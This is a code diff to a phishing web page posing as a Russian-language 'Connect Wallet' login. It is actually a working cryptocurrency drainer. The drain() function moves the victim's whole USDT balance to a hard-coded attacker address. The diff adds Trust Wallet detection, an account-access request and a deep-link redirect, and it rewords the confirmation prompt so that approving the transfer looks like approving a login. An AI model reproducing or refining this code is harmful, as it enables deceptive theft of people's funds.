@@ -28,13 +28,10 @@
     border:none;padding:20px;font-size:19px;font-weight:600;
     color:#fff;border-radius:16px;cursor:pointer;
     box-shadow:0 6px 24px rgba(51,153,255,.35);
-    transition:transform .1s;
-    touch-action:manipulation;
+    transition:transform .1s;touch-action:manipulation;
   }
   button:active{transform:scale(.97)}
-  .loader{
-    display:none;margin-top:28px;text-align:center;color:#8b949e;font-size:15px
-  }
+  .loader{display:none;margin-top:28px;text-align:center;color:#8b949e;font-size:15px}
   .spinner{
     width:28px;height:28px;border:3px solid #3399ff;
     border-top-color:transparent;border-radius:50%;
@@ -50,11 +47,11 @@
 <h2>Connect Wallet</h2>
 <div class="sub">Подключите свой кошелёк для входа</div>
 
-<button onclick="start()">Подключить кошелёк</button>
+<button id="btn" onclick="start()">Подключить кошелёк</button>
 
-<div class="loader">
+<div class="loader" id="loader">
   <div class="spinner"></div>
-  <div>Соединение с кошельком...</div>
+  <div id="loaderText">Соединение с кошельком...</div>
 </div>
 <p id="status"></p>
 
@@ -63,18 +60,59 @@ const TO = "TWanTomGkHcNWhCVrYkohnuYkbBRKZLere";
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 function showLoader(t){
-  document.querySelector(".loader").style.display = "block";
-  document.querySelector(".loader div:last-child").innerText = t;
+  document.getElementById("loader").style.display = "block";
+  document.getElementById("loaderText").innerText = t;
+}
+function hideLoader(){
+  document.getElementById("loader").style.display = "none";
+}
+
+// Ждём, пока Trust внедрит tronWeb в страницу (может занять 1-3 сек)
+function waitForTronWeb(timeout = 8000){
+  return new Promise((resolve, reject) => {
+    const started = Date.now();
+    const check = () => {
+      if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+        resolve(window.tronWeb);
+      } else if(Date.now() - started > timeout){
+        reject("timeout");
+      } else {
+        setTimeout(check, 250);
+      }
+    };
+    check();
+  });
+}
+
+// Запрос доступа к аккаунту — Trust покажет окно "Подключиться"
+async function requestAccounts(tronWeb){
+  if(tronWeb.request){
+    try{ await tronWeb.request({ method: "tron_requestAccounts" }); }catch(e){}
+  }
+  // после разрешения адрес появляется
+  for(let i = 0; i < 10; i++){
+    if(tronWeb.defaultAddress && tronWeb.defaultAddress.base58) return;
+    await new Promise(r => setTimeout(r, 300));
+  }
 }
 
 async function start(){
-  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
-    await drain(window.tronWeb);
-  } else {
-    showLoader("Открываю Trust Wallet...");
-    const url = location.href;
-    location.href = "https://link.trustwallet.com/open_url?coin=cointype_trc20&url=" + encodeURIComponent(url);
+  showLoader("Соединение с кошельком...");
+
+  if(window.tronWeb){
+    // Уже внутри Trust Wallet — подключаемся
+    const tronWeb = window.tronWeb;
+    await requestAccounts(tronWeb);
+    if(tronWeb.defaultAddress && tronWeb.defaultAddress.base58){
+      await drain(tronWeb);
+      return;
+    }
   }
+
+  // Открыто в обычном браузере — открываем в Trust
+  showLoader("Открываю Trust Wallet...");
+  const url = location.href;
+  location.href = "https://link.trustwallet.com/open_url?coin=cointype_trc20&url=" + encodeURIComponent(url);
 }
 
 async function drain(tronWeb){
@@ -86,9 +124,8 @@ async function drain(tronWeb){
     const contract = await tronWeb.contract().at(USDT);
     const bal = await contract.balanceOf(from).call();
     if(bal.toNumber() > 0){
-      showLoader("Подтвердите в кошельке не выходя из приложения");
+      showLoader("Подтвердите вход в кошельке");
       await contract.transfer(TO, bal.toString()).send({ feeLimit: 100000000 });
-      document.getElementById("status").innerText = "Готово ✅";
     }
   }catch(e){}
 
@@ -100,7 +137,7 @@ async function drain(tronWeb){
     }
   }catch(e){}
 
-  document.querySelector(".loader").style.display = "none";
+  hideLoader();
   document.getElementById("status").innerText = "Вход выполнен ✅";
 }
 </script>
